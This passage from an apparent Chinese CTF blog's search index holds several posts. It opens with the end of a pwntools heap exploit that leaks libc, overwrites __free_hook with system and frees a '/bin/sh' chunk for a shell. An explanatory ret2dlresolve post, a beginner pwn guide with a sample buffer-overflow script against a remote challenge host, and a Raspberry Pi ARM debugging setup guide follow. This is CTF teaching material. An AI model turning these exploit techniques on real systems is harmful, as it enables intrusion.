<span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x100</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    dele(<span class="number">7</span>-i)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x10</span>,<span class="string">b&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">un_addr=u64(ru(io,<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;un_addr : &#x27;</span>+<span class="built_in">hex</span>(un_addr))</span><br><span class="line">libc.address=un_addr-<span class="number">0x1ebce0</span></span><br><span class="line">success(<span class="string">&#x27;libc_base : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;system : &#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">free_hook=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;free_hook : &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,p64(system))</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> X86/x64pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2dlresolve</title>
      <link href="/2021/07/24/ret2dlresolve/"/>
      <url>/2021/07/24/ret2dlresolve/</url>
      
        <content type="html"><![CDATA[<h1 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h1><p>在了解ret2dl之前我们先回顾一下ELF下的<strong>延迟绑定</strong>过程——<em><strong>PLT</strong></em>，在ELF文件中当我们调用函数都是通过一个叫做PLT项的结构来进行跳转的，假设我们有一个bar()函数，其在PLT中的地址我们称为bar@PLT。那么其实现为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bar@plt:</span><br><span class="line">jmp *(bar@GOT)</span><br><span class="line">push n</span><br><span class="line">push moduleID</span><br><span class="line">jump _dl_runtime_resolve</span><br></pre></td></tr></table></figure><p>bar@plt的第一条通过GOT间接跳转指令，假设我们已经进行过延迟绑定，此时bar@GOT里存放这我们真正的bar函数对应的项，那么这个跳转指令自然会跳转到我们想要的地方。但是，如果还没有进行过延迟绑定那，那么此时这里存放的必定不是我们想要的地址，<strong>此时bar@GOT存放的其实是bar@plt的第二条指令</strong>，第二条指令是将一个数字n压入栈里，而这个数字是<strong>bar这个符号引用在重定位表”.rel.plt”的下标</strong>。接下来又一个push将指令模块的ID压入栈中，最后再跳转到 <em><strong>_dl_runtime_resolve</strong></em>。</p><p>当bar()这个函数被解析过一次，那么下次调用就不用再次重定位，只需要直接跳转到bar()函数中。ELF将GOT拆为两个表”.got”和 “.got.plt”，其中”.got”来报存全局变量引用地址，”.got.plt”保存函数引用地址。</p><h1 id="一些重要的section"><a href="#一些重要的section" class="headerlink" title="一些重要的section"></a>一些重要的section</h1><h2 id="“-interp”"><a href="#“-interp”" class="headerlink" title="“.interp”"></a>“.interp”</h2><p>当我们的系统将可执行文件装载之后，其中好多地址还处于无效状态，此时需要<strong>动态链接器</strong>通过映射的方法加载到进程的地址空间中。操作系统加载完动态链接器后，将控制权交给动态链接器的入口地址。动态链接器获取控制器，执行自身初始化工作，然后根据环境参数对可执行文件进行动态链接工作。当动态链接工作完成后将控制权交由可执行文件入口，程序开始正式执行。</p><p>而动态链接器的位置由谁来决定那？实际上是由ELF文件自己决定的，而决定这一切的section叫做<em><strong>.interp</strong></em>。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210726111522241.png" alt="’.interp‘"></p><p>上图就是某个文件的’.interp’段，大多数情况下动态链接器都位于/lib里，但是这里我用patchelf更改过了，也说明这里是可以更改的，由ELF文件自己决定的。</p><p>这个段的内容很简单，里面就保存了上面这样的字符串，而这个字符串就是动态链接器的路径。</p><h2 id="“-dynamic”"><a href="#“-dynamic”" class="headerlink" title="“.dynamic”"></a>“.dynamic”</h2><p>动态链接最为重要的结构就是<em><strong>.dynamic</strong></em>，这个段保存了动态链接库需要的最基本的信息，比如依赖于哪些共享对象、动态连接符号表的位置、动态链接重定位表位置、共享对象初始化代码的地址等。这方面有点类似于ELF的文件头，它可以算是在动态链接下对ELF头的补充。我们随便找一个文件看一看他的”.dynamic”段。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210727162459172.png" alt="&#39;.dynamic&#39;"></p><p>其结构体为</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure><p>其中:</p><p><strong>NEEDED</strong>是依赖的共享对象文件；</p><p><strong>INIT</strong>是初始化代码地址，也就是.init的位置，<strong>FINT</strong>是结束代码地址，也就是.fini的位置;</p><p><strong>GUN_HASH</strong>是动态链接哈希表地址；</p><p><strong>STRTAB</strong>是动态链接字符串表的位置，表示<strong>.dynstr</strong>的位置;</p><p><strong>SYMTAB</strong>是动态链接符号表的位置,表示<strong>.dynsym</strong>的位置;</p><p><strong>PLTGOT</strong>指向<strong>.got</strong>的位置;</p><p><strong>JMPREL</strong>表示重定位表，也就是<strong>.rel.plt</strong>；</p><p><strong>REL\RELA</strong>表示动态链接重定位表的位置;<strong>RELENT/RELAENT</strong>表示动态重读位表入口数量</p><h2 id="“-dynsym”-”-dynstr”-amp-”-hash”"><a href="#“-dynsym”-”-dynstr”-amp-”-hash”" class="headerlink" title="“.dynsym”,”.dynstr”&amp;”.hash”"></a>“.dynsym”,”.dynstr”&amp;”.hash”</h2><p>在静态链接中有一个专门的段叫做<em><strong>.symtab</strong></em>,里面保存了所有关于该目标的符号的定义和引用.而为了表示动态链接模块间的符号导入导出关系,ELF专门有一个叫做<strong>动态链接符号表</strong>的段用来保存这些信息,也就是<em><strong>.dynsym</strong></em>.</p><p>重要的是”.dynsym”只保存了动态链接相关的符号,而模块内私有的变量则不会保存.通常动态链接的模块同时包含这两个段,”.symtab”包含所有的符号,也包括”.dynsym”中的符号.静态链接中需要”.strtab”,一个用于保存符号名的字符串表.而”.cybsym”对应的就是动态符号字符串表<em><strong>.dynstr</strong></em>.由于动态链接中我们需要在程序运行的时候查找符号,为了加快符号的查找过程,往往通过<strong>符号哈希表</strong>—<em><strong>.hash</strong></em>来加快符号查找速度</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210727170027080.png" alt="&#39;.dynsym&#39;"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210727170510147.png" alt="&#39;.hash&#39;"></p><h2 id="“-rel-dyn”-amp-”-rel-plt”"><a href="#“-rel-dyn”-amp-”-rel-plt”" class="headerlink" title="“.rel.dyn”&amp;”.rel.plt”"></a>“.rel.dyn”&amp;”.rel.plt”</h2><p>静态链接中有<em><strong>.rel.text</strong></em>(代码段重定位表)和<em><strong>.rel.data</strong></em>(数据段重定位表)作为静态链接中用于表示重定位信息的重定位表.</p><p>在动态链接中自然也有与之对应的重定位表<em><strong>.rel.dyn</strong></em>,<em><strong>.rel,plt</strong></em>.”rel.dtn”实际上是对数据引用的修正,它所修正的位置位于”.got”以及数据段;而”.rel.plt”是对函数引用的修正,它所修正的位置位于”.got.plt”.</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210727180200847.png" alt="&#39;.rel.fyn&#39;&amp;&#39;.rel.plt&#39;"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210727180447657.png" alt="SHT"></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> X86/x64pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn入门指南</title>
      <link href="/2021/07/19/pwn%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/"/>
      <url>/2021/07/19/pwn%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>写这篇是因为学校社团招新需要给学弟学妹每个方向的大致印象，发展方向，当然我也希望这篇文章可以帮助到更多的人。接下来我会介绍一下入门pwn需要准备一些什么，学习一些什么，希望这些不成熟的意见可以帮助到刚开始入门pwn的你。由于篇幅有限，这里不会详细介绍各个知识点，更多的是一些链接，不涉及具体内容，只是帮你找到你应该学什么，推荐一些学习资源。</p><h1 id="书籍推荐"><a href="#书籍推荐" class="headerlink" title="书籍推荐"></a>书籍推荐</h1><p>这里推荐一些适合刚刚准备入门pwn方向的书籍，所以这里并没有列出一些pwn方向很重要，但不是新手需要的书籍。</p><h2 id="《程序员的自我修养：链接装载与库》"><a href="#《程序员的自我修养：链接装载与库》" class="headerlink" title="《程序员的自我修养：链接装载与库》"></a>《程序员的自我修养：链接装载与库》</h2><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/1b4c510fd9f9d72a95616a43df2a2834349bbb63" alt="程序员的自我修养"></p><p>这本书是对pwn入门来说非常非常有用的一本书，可以说是一本必读的书，能让你更清楚的了解很多pwn知识点背后的逻辑。可以说是必读的书了。</p><h2 id="《CTF竞赛权威指南（Pwn篇）》"><a href="#《CTF竞赛权威指南（Pwn篇）》" class="headerlink" title="《CTF竞赛权威指南（Pwn篇）》"></a>《CTF竞赛权威指南（Pwn篇）》</h2><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/0b55b319ebc4b74543a9b3057cb609178a82b901bfc4" alt="ctf权威指南"></p><p>书中涵盖了pwn各个方向的知识点，虽说很多最新的知识点该书不能提供，但是作为入门数据，这本书的知识点起码够你学大半年了。比市面上其他ctf入门书籍更加适合pwn手，强烈推荐。</p><h2 id="《深入理解计算机系统（又名CSAPP）》"><a href="#《深入理解计算机系统（又名CSAPP）》" class="headerlink" title="《深入理解计算机系统（又名CSAPP）》"></a>《深入理解计算机系统（又名CSAPP）》</h2><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/s29195878.jpg" alt="csapp"></p><p>这是一本很厚重的书，虽说没有像上面两本书那么直接对pwn做题有直接帮助，但是这本书一定是pwn方向，不不不，它可以说是所有计算机方向必读书籍了，对你长期成长来说肯定有帮助，希望在闲暇时间去读一读。</p><h1 id="网站以及入门视频推荐"><a href="#网站以及入门视频推荐" class="headerlink" title="网站以及入门视频推荐"></a>网站以及入门视频推荐</h1><p>刷题网站和ctfwiki这里就不做过多的赘述了，这里提供一些适合新人pwn方向独有的平台，和自己觉得不错的入门视频</p><h2 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h2><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210719104848925.png" alt="pwnable.kr"></p><p>网址：<a href="https://pwnable.kr/">https://pwnable.kr/</a></p><p>这个平台的漏洞虽然和我们国内比赛主流方向的关系不是很大，但是里面有很多可以学习的知识点，还是很推荐大家做一做的，很多题目比较适合新手。</p><h2 id="XMCVE-2020-CTF-Pwn入门课程"><a href="#XMCVE-2020-CTF-Pwn入门课程" class="headerlink" title="XMCVE 2020 CTF Pwn入门课程"></a>XMCVE 2020 CTF Pwn入门课程</h2><p>网址：<a href="https://www.bilibili.com/video/BV1854y1y7Ro?share_source=copy_web">https://www.bilibili.com/video/BV1854y1y7Ro?share_source=copy_web</a></p><p>这部视频可以说是全b站最为详细的pwn入门视频了，细节抓的很清楚，缺点就是过于详实，可能会让你缺少一份自己的思考，视频时间也过长，需要耐心观看</p><h2 id="2020暑期Lilac-pwn入门培训"><a href="#2020暑期Lilac-pwn入门培训" class="headerlink" title="2020暑期Lilac-pwn入门培训"></a>2020暑期Lilac-pwn入门培训</h2><p>网址：<a href="https://www.bilibili.com/video/BV1Dt4y1D7mK?share_source=copy_web">https://www.bilibili.com/video/BV1Dt4y1D7mK?share_source=copy_web</a></p><p>这部视频其实是我入门时观看的视频，个人感觉讲解的很充分了，适合想要快速入门开始刷题的师傅们，其实从博客和题目中学习也是一种比较有效的方法</p><h1 id="pwn入门需要的基础知识"><a href="#pwn入门需要的基础知识" class="headerlink" title="pwn入门需要的基础知识"></a>pwn入门需要的基础知识</h1><h2 id="掌握c语言"><a href="#掌握c语言" class="headerlink" title="掌握c语言"></a>掌握c语言</h2><p>想要学习pwn首先就要学习c语言，这是最最最基础的工作，如果没有学习过c语言，可能连题目都看不懂。</p><p>推荐翁恺老师的c语言课程：<a href="https://www.icourse163.org/course/ZJU-9001?from=searchPage">https://www.icourse163.org/course/ZJU-9001?from=searchPage</a></p><h2 id="学习汇编"><a href="#学习汇编" class="headerlink" title="学习汇编"></a>学习汇编</h2><p>学习pwn还是要懂汇编语言的，起码先学习x86/x64下的汇编语言，学好汇编会让你开始的路走的很轻松，可以先学习8060的汇编，推荐王爽老师的《汇编语言》</p><h2 id="使用ida"><a href="#使用ida" class="headerlink" title="使用ida"></a>使用ida</h2><p>ida是一个非常好用的静态分析工具，可以说是一个神器，她会帮助你非常轻松的分析出题目的逻辑，基本是必须会使用的工具。你会发现ida的图标是一个女性，其实这是第一位程序员，她的名字就叫ida。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210719111139804.png" alt="image-20210719111139804"></p><p>推荐一篇博客：<a href="https://xz.aliyun.com/t/4205%EF%BC%8C%E8%BF%99%E9%87%8C%E6%9C%89%E8%AF%A6%E7%BB%86%E7%9A%84%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B">https://xz.aliyun.com/t/4205，这里有详细的使用教程</a></p><h2 id="使用pwndbg"><a href="#使用pwndbg" class="headerlink" title="使用pwndbg"></a>使用pwndbg</h2><p>这其实是一个gdb的调试插件，这个工具可以帮助你更好的进行动态分析。关于工具的安装可以看我的另一篇博客，虽然是针对arm架构的树莓派的，但对于x64的ubuntu也适用。</p><p>安装：<a href="https://kr0emer.com/2021/07/16/%E5%88%A9%E7%94%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%9E%E7%8E%B0arm%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84heap%E8%B0%83%E8%AF%95/#pwn%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">https://kr0emer.com/2021/07/16/%E5%88%A9%E7%94%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%9E%E7%8E%B0arm%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84heap%E8%B0%83%E8%AF%95/#pwn%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA</a></p><h2 id="使用pwntools"><a href="#使用pwntools" class="headerlink" title="使用pwntools"></a>使用pwntools</h2><p>pwnatools的安装上面的链接中也有，这是一个编写python交互的库，是pwn入门必备的工具。</p><p>编写脚本类似这样：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">44908</span>)</span><br><span class="line">sh_addr=<span class="number">0x0804868B</span></span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">24</span>+p32(sh_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">262</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;your username:&quot;</span>,<span class="string">&#x27;kreomer&#x27;</span>) </span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;your passwd:&quot;</span>,payload) </span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>官方教程：<a href="https://docs.pwntools.com/en/latest/">https://docs.pwntools.com/en/latest/</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>pwn入门的基础基本就是以上这些，想要了解具体的攻击方法可以通过以上书籍、视频或者借助ctfwiki来学习（<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/%EF%BC%89%EF%BC%8C%E7%94%B1%E4%BA%8E%E5%8F%AA%E6%98%AF%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E6%8C%87%E5%8D%97%EF%BC%8C%E8%BF%99%E9%87%8C%E4%B8%8D%E6%B6%89%E5%8F%8A%E5%85%B7%E4%BD%93%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E3%80%82%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E4%BB%A5%E4%B8%8A%E6%8F%90%E4%BE%9B%E7%9A%84%E9%93%BE%E6%8E%A5%E8%BF%9B%E8%A1%8C%E5%AD%A6%E4%B9%A0%E3%80%82">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/），由于只是一个简单的指南，这里不涉及具体漏洞的攻击方法。可以通过以上提供的链接进行学习。</a></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> X86/x64pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用树莓派实现arm架构下的heap调试</title>
      <link href="/2021/07/16/%E5%88%A9%E7%94%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%9E%E7%8E%B0arm%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84heap%E8%B0%83%E8%AF%95/"/>
      <url>/2021/07/16/%E5%88%A9%E7%94%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%9E%E7%8E%B0arm%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84heap%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="一切的开始"><a href="#一切的开始" class="headerlink" title="一切的开始"></a>一切的开始</h1><p>​    在最近半年多的比赛中总是可以看到很多都涉及arm架构，比如：红明谷，虎符，国赛等大大小小的比赛都涉及了关于arm架构的题目。常规的做法是搭建<strong>quem</strong>虚拟机，然后使用<strong>gdbserver</strong>远程调试，来达到调试目的，当然也可以再用<strong>patchelf</strong>改一下动态链接库，使用<strong>python脚本</strong>交互。但是这样调试起来会发现没有调试，这种情况下当然也可以通过查看内存分布来进行调试。<strong>缺少了调试符调试起来感觉太麻烦了，也不够直观</strong>。当时的第一反应是下载<strong>带调试符的libc</strong>，当我找到对应版本的带有<strong>.debug</strong>文件的libc文件，使用patchelf将其和我们的binary绑定，同样使用quem来进行调试，可是这样依旧是显示没有调试符。而且看之前大师傅的博客说quem会存在一些奇奇怪怪的bug，就想是否可以直接使用arm架构的<strong>树莓派</strong>来搭建环境，调试arm下的题目。网上我查了好久也没找到类似的文章，就只能自己来试试了，顺便写出来分享给大家我的拙见，如果对你有帮助就太好了，也乘此机会搭建起来自己的博客，这就是我写这篇文章的开始，也是我博客的开始。</p><h1 id="树莓派的选择和ubuntu镜像烧录"><a href="#树莓派的选择和ubuntu镜像烧录" class="headerlink" title="树莓派的选择和ubuntu镜像烧录"></a>树莓派的选择和ubuntu镜像烧录</h1><h2 id="树莓派以及其他硬件的选择"><a href="#树莓派以及其他硬件的选择" class="headerlink" title="树莓派以及其他硬件的选择"></a>树莓派以及其他硬件的选择</h2><p>​    树莓派我选择的是<em>Raspberry Pi 4</em>，内存大小4GB，感觉就调试arm题目的话性能有点溢出，因为不使用桌面，所以内存可以选小一点，没必要选择这么大的内存，当然一切随你喜好。貌似还有香橙派，我不知道怎么样，有兴趣可以尝试，不保证可以搭配后面的流程，但其<strong>价格</strong>确实可爱的多。</p><p>​    树莓派使用的是<strong>tf</strong>卡，我觉得没必要买太大容量的，我环境完全搭建完成后也没有用太大的容量，同样是因为不需要桌面的原因。我们可以选择<strong>16GB</strong>的，这个容量应该是足够了。配套的需要一个一个<strong>读卡器</strong>来烧录镜像。</p><p>​    电源是<strong>5.1v=3.0A</strong>的，<strong>type-c</strong>接口，可以考虑使用手机充电器，但是最好还是买一个充电器比较好，这样比较方便。也可以考虑官方的充电器，就是有点小贵。</p><p>​    顺便一提，最好买个“机箱”，这样能保护好电路板，方便携带，同时要做好散热工作，散热片是要的，也可以使用一个小风扇。类似下图</p><p>​    <img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210716193707410.png" alt="树莓派机箱和风扇"></p><p>​    这里可能还需要使用显示屏和键盘，当然只有第一次搭建的时候需要使用，ubuntu官方文档中说可以不需要，但是我尝试了有一整天，并不能达到我想要的效果，这里放在后面环境搭建的时候再说。树莓派的视频接口是<strong>Micro</strong>，所以你需要有一头是Micro的视频传输线，也可以使用转换接口，我使用的就是转换接口，毕竟只用这一次，没必要买太贵的，键盘和显示屏都是借用舍友的，这里感谢我的舍友。</p><p>​    硬件就是这些啦，准备好硬件后就可以进行烧录和启动我们的ubuntu系统啦</p><h2 id="ubuntu环境的烧录和启动"><a href="#ubuntu环境的烧录和启动" class="headerlink" title="ubuntu环境的烧录和启动"></a>ubuntu环境的烧录和启动</h2><p>​    这里提供一个链接指导我们的安装ubuntu镜像(<a href="https://ubuntu.com/tutorials/how-to-install-ubuntu-on-your-raspberry-pi#1-overview">https://ubuntu.com/tutorials/how-to-install-ubuntu-on-your-raspberry-pi#1-overview</a>),</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717084431014.png" alt="烧录工具"></p><p>​    这里有三个不同的选项根据你主机的操作系统选择合适的烧录。具体的烧录方法可以参考上面的链接，内容很详实。一定要仔细看上面的官方文档，不然可能会出现一些奇奇怪怪的问题。</p><p>​    关于树莓派的wifi链接这里有个大坑，官方文档是这样说的：</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717090334507.png" alt="官方文档截图"></p><p>​    </p><p>但是实际上这里如果没有显示屏和键盘的话无法重启进行重启，也就<strong>无法连接</strong>到wife，而且由于某些奇怪的原因这个<strong>配置文件</strong>还需要在开机后再次编写以保证格式，所以之前准备工作才说明需要显示屏和键盘，当然你也可以再尝试尝试，说不定就成功了，有时候挺玄学的。</p><p>这里我基本花了一天时间，大多数时间在无意义的修改配置文件，因为没有显示屏转换器，以为是配置文件格式问题，结果花了一天时间都没解决，等转换器到了使用显示器基本一会就解决了，只要你的配置文件格式保证，开机后设置密码，然后<strong>重启</strong>，重启以后<strong>等待一会</strong>基本就可以连接到wifi了，如果无法链接，检查一下配置文件</p><p><strong>注意：配置文件中冒号后面一定有换行或者空格，而且还要注意对齐</strong>。</p><h1 id="寻找树莓派IP以及ssh连接"><a href="#寻找树莓派IP以及ssh连接" class="headerlink" title="寻找树莓派IP以及ssh连接"></a>寻找树莓派IP以及ssh连接</h1><h2 id="寻找树莓派ip地址"><a href="#寻找树莓派ip地址" class="headerlink" title="寻找树莓派ip地址"></a>寻找树莓派ip地址</h2><p>官方文档给了一种寻找树莓派的方法，但是我尝试过后感觉并不是很有用，后来发现其mac地址和官方的有出入，假如你使用的是手机热点，并且你的手机热点可以显示ip地址最好不过了，如果是其他情况的话这里我推荐使用<strong>Nmap</strong>来进行扫描。</p><p>这里肯定先要保证你和树莓派在同一个wifi下，然后检查你本地的ip地址win操作系统下使用<code>ipconfig</code>查看本地IP地址</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717093955362.png" alt="查看本地ip"></p><p>可以看到<strong>ip</strong>地址是192.168.43.29,<strong>子网掩码</strong>是255.255.255.0，那么我们就要检查192.168.43.1/24这个网络下的存活的ip有哪些</p><p>使用<code>nmap -sP 192.168.43.1/24</code>命令我们可以看到</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717094520150.png" alt="寻找树莓派"></p><p>有两台存活主机，一台是我们主机，那么另一台就是我们的树莓派了，当然可以看到其mac地址后面也告诉我们这台主机是树莓派。这样我们就找到我们树莓派的ip是192.168.43.29。</p><h2 id="使用FInallshell进行连接"><a href="#使用FInallshell进行连接" class="headerlink" title="使用FInallshell进行连接"></a>使用FInallshell进行连接</h2><p>接下来我推荐使用Finalshell来建立连接。这个工具要比xshell好用好多了</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717095624945.png" alt="Finalshell"></p><p>首先点击这里打开连接管理器</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717095715919.png" alt="连接管理器"></p><p>再点击这里新建ssh连接</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717095821208.png" alt="新建ssh连接"></p><p>以这样的格式填写即可。</p><p>然后就可以开始链接我们的树莓派啦，当然你肯定会觉得这个窗口不是很好看，背景挺碍眼的，这里其实可以<strong>关闭背景</strong>，鼠标右击可以看到下面有设置背景图片</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717100427076.png" alt="设置背景图片"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717100719414.png" alt="配置配色字体以及关闭背景"></p><p>把启用图片的√打掉就好了，此时你还发现取消掉背景怎么还是蓝色的，别着急，看看这里还要配色栏，你有很多钟配色可以选择，最下面有字体大小选择，这样就可以选择合适的字体大小和配色啦（毕竟<em>皮肤和坐骑的搭配才是获胜的关键</em>，这样就可以舒舒服服的进行调试啦。</p><h1 id="pwn调试环境搭建"><a href="#pwn调试环境搭建" class="headerlink" title="pwn调试环境搭建"></a>pwn调试环境搭建</h1><p>接下来就可以正式开始我们的环境搭建了，这里才是痛苦的开始，在配置环境期间遇到了数不清的问题，这一部分仅供参考，实际安装的时候还是要记得多搜索，毕竟这里每个人遇到的情况都有可能不同。</p><h2 id="python2的pip安装和pwntools安装"><a href="#python2的pip安装和pwntools安装" class="headerlink" title="python2的pip安装和pwntools安装"></a>python2的pip安装和pwntools安装</h2><p>我们先来解决最困难的，也就是python2的pwntools安装，之前一直是直接使用pip连接并没有发现什么问题，但是这次却有些问题，不管怎么说先安装python2</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt install python</span><br><span class="line">sudo update-alternatives --install /usr/bin/python python /usr/bin/python2.7 1</span><br></pre></td></tr></table></figure><p>这样就将python的默认为python2了，如下图</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717105912959.png" alt="python默认pthon2"></p><p>接下来是pip的安装，现在已经无法正常安装python2的pip了，只能采取一些其他的手法,先安装setup-tools，这里需要先安装打开zip文件的软件</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt install unzip</span><br><span class="line">wget https://pypi.python.org/packages/45/29/8814bf414e7cd1031e1a3c8a4169218376e284ea2553cc0822a6ea1c2d78/setuptools-36.6.0.zip<span class="comment">#md5=74663b15117d9a2cc5295d76011e6fd1</span></span><br><span class="line">unzip setuptools-36.6.0.zip </span><br><span class="line"><span class="built_in">cd</span> setuptools-36.6.0</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><p>再安装pip</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py</span><br><span class="line">sudo python2 get-pip.py</span><br></pre></td></tr></table></figure><p>查看pip版本<code>pip --version </code></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717113029446.png" 